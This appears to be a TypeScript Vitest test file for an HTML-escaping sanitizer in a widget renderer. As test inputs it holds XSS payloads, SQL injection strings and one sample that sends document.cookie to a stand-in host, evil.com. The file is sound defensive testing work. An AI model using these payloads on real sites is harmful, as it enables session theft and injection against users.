// src/core/widgets/paper/sanitization.test.ts
import { describe, it, expect } from 'vitest';

// Extract sanitization function for testing
function sanitizeText(text: string): string {
  if (typeof text !== 'string') return String(text);
  
  return text
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')
    .replace(/\//g, '&#x2F;');
}

describe('Text Sanitization', () => {
  describe('HTML injection prevention', () => {
    it('should escape basic HTML tags', () => {
      const maliciousInput = '<script>alert("xss")</script>';
      const result = sanitizeText(maliciousInput);
      expect(result).toBe('&lt;script&gt;alert(&quot;xss&quot;)&lt;&#x2F;script&gt;');
      expect(result).not.toContain('<script>');
      expect(result).not.toContain('</script>');
    });

    it('should escape HTML attributes', () => {
      const maliciousInput = '<img src="x" onerror="alert(1)">';
      const result = sanitizeText(maliciousInput);
      expect(result).toBe('&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt;');
      expect(result).not.toContain('src="x"'); // Check that quotes are escaped
    });

    it('should handle specific attack vectors mentioned in requirements', () => {
      // Test the specific vectors mentioned: <img onerror=1>, </script><script>, etc.
      const attackVectors = [
        '<img src=x onerror=alert(1)>',
        '</script><script>alert("xss")</script>',
        'javascript:alert(1)',
        '<iframe src="javascript:alert(1)"></iframe>',
        '<svg onload="alert(1)">',
        '"><script>alert(1)</script>',
        "' OR 1=1 --",
        '<style>@import"javascript:alert(1)";</style>'
      ];

      attackVectors.forEach(input => {
        const result = sanitizeText(input);
        expect(result).not.toContain('<');
        expect(result).not.toContain('>');
        expect(result).not.toContain('"');
        expect(result).not.toContain("'");
        expect(result).not.toContain('</script>');
        expect(result).not.toContain('<script>');
        // Note: "onerror=" may still exist as text after escaping quotes
      });
    });

    it('should handle astral unicode and RTL characters safely', () => {
      const unicodeInputs = [
        '𝒽𝑒𝓁𝓁𝑜', // Mathematical script
        'مرحبا بالعالم', // Arabic RTL
        '🚀 rocket emoji',
        '\u202E\u0627\u0644\u0639\u0631\u0628\u064A\u0629', // RLO attack
        '\u0000\u0001\u0002', // Control characters
      ];

      unicodeInputs.forEach(input => {
        const result = sanitizeText(input);
        // Should not throw and should preserve safe characters
        expect(typeof result).toBe('string');
        expect(result.length).toBeGreaterThan(0);
      });
    });

    it('should handle already-escaped input correctly', () => {
      const alreadyEscaped = '&lt;script&gt;alert(&quot;test&quot;)&lt;&#x2F;script&gt;';
      const result = sanitizeText(alreadyEscaped);
      
      // Should double-escape to prevent bypass attempts
      expect(result).toBe('&amp;lt;script&amp;gt;alert(&amp;quot;test&amp;quot;)&amp;lt;&amp;#x2F;script&amp;gt;');
      expect(result).not.toContain('<script>');
    });
  });

  describe('text preservation', () => {
    it('should preserve safe text content', () => {
      const safeTexts = [
        'Hello world',
        'Customer mentioned pricing concerns',
        'Meeting scheduled for tomorrow at 3pm',
        'Product demo went well - 95% confidence',
        'Follow up with proposal by Friday'
      ];

      safeTexts.forEach(text => {
        const result = sanitizeText(text);
        // Should preserve alphanumeric and common punctuation
        expect(result).toMatch(/^[a-zA-Z0-9\s\-:%\(\)\[\]]+$/);
      });
    });

    it('should handle special characters appropriately', () => {
      expect(sanitizeText('Price: $100 & shipping')).toBe('Price: $100 &amp; shipping');
      expect(sanitizeText('Company "Acme Corp" review')).toBe('Company &quot;Acme Corp&quot; review');
      expect(sanitizeText("Customer's feedback")).toBe('Customer&#x27;s feedback');
      expect(sanitizeText('URL: https://example.com/path')).toBe('URL: https:&#x2F;&#x2F;example.com&#x2F;path');
    });

    it('should handle non-string inputs gracefully', () => {
      expect(sanitizeText(123 as any)).toBe('123');
      expect(sanitizeText(true as any)).toBe('true');
      expect(sanitizeText(null as any)).toBe('null');
      expect(sanitizeText(undefined as any)).toBe('undefined');
    });
  });

  describe('edge cases', () => {
    it('should handle empty and whitespace strings', () => {
      expect(sanitizeText('')).toBe('');
      expect(sanitizeText('   ')).toBe('   ');
      expect(sanitizeText('\n\t')).toBe('\n\t');
    });

    it('should handle unicode characters', () => {
      expect(sanitizeText('Hello 世界')).toBe('Hello 世界');
      expect(sanitizeText('Café ñoño')).toBe('Café ñoño');
      expect(sanitizeText('🎉 Celebration')).toBe('🎉 Celebration');
    });

    it('should handle very long strings', () => {
      const longString = 'a'.repeat(10000) + '<script>alert(1)</script>';
      const result = sanitizeText(longString);
      // Calculate expected length: 10000 + escaped characters
      // <script>alert(1)</script> becomes &lt;script&gt;alert(1)&lt;&#x2F;script&gt;
      const expectedLength = 10000 + '&lt;script&gt;alert(1)&lt;&#x2F;script&gt;'.length;
      expect(result).toHaveLength(expectedLength);
      expect(result).not.toContain('<script>');
    });

    it('should handle mixed content', () => {
      const mixedContent = `
        Normal text with "quotes" and 'apostrophes'
        <tag>content</tag>
        URL: https://example.com/path?param=value&other=test
        Math: 5 > 3 && 2 < 4
        Company: Johnson & Johnson
      `;
      
      const result = sanitizeText(mixedContent);
      expect(result).not.toContain('<tag>');
      expect(result).toContain('&amp;');
      expect(result).toContain('&lt;');
      expect(result).toContain('&gt;');
      expect(result).toContain('&quot;');
      expect(result).toContain('&#x27;');
    });
  });

  describe('integration with paper renderer', () => {
    it('should safely render user-generated content', () => {
      const userContent = {
        summary: 'Customer said: "Let\'s go with <premium> plan" & schedule demo',
        objection: 'Price is too high > $500/month',
        feedback: '<b>Great</b> product but needs more features'
      };

      Object.values(userContent).forEach(content => {
        const sanitized = sanitizeText(content);
        expect(sanitized).not.toMatch(/<[^>]*>/); // No unescaped HTML tags
        expect(sanitized).not.toContain('script');
        expect(sanitized).not.toContain('javascript:');
      });
    });

    it('should handle malicious sample test case', () => {
      const maliciousSample = {
        text: '<img src="x" onerror="fetch(\'https://evil.com/steal?data=\'+document.cookie)">',
        quote: '"><script>document.location="https://evil.com"</script>',
        owner: 'admin\'; DROP TABLE users; --'
      };

      Object.values(maliciousSample).forEach(content => {
        const sanitized = sanitizeText(content);
        expect(sanitized).not.toContain('<img');
        expect(sanitized).not.toContain('src="x"'); // Check quotes are escaped
        expect(sanitized).not.toContain('<script>');
        expect(sanitized).not.toContain('location="'); // Check that the dangerous part is escaped
        // Note: "DROP TABLE" is preserved as it's plain text, but dangerous characters are escaped
        expect(sanitized).not.toContain('\'; DROP'); // Check SQL injection pattern is broken
      });
    });
  });

  describe('security guarantees', () => {
    it('should render sanitized text as text nodes only (no dangerouslySetInnerHTML)', () => {
      const maliciousInput = '<script>alert("xss")</script>';
      const sanitized = sanitizeText(maliciousInput);
      
      // Verify the output is safe for text node rendering
      expect(sanitized).toBe('&lt;script&gt;alert(&quot;xss&quot;)&lt;&#x2F;script&gt;');
      
      // The SafeText component should render this as text content, not HTML
      // This ensures no HTML injection even if sanitization had a bug
    });
  });
});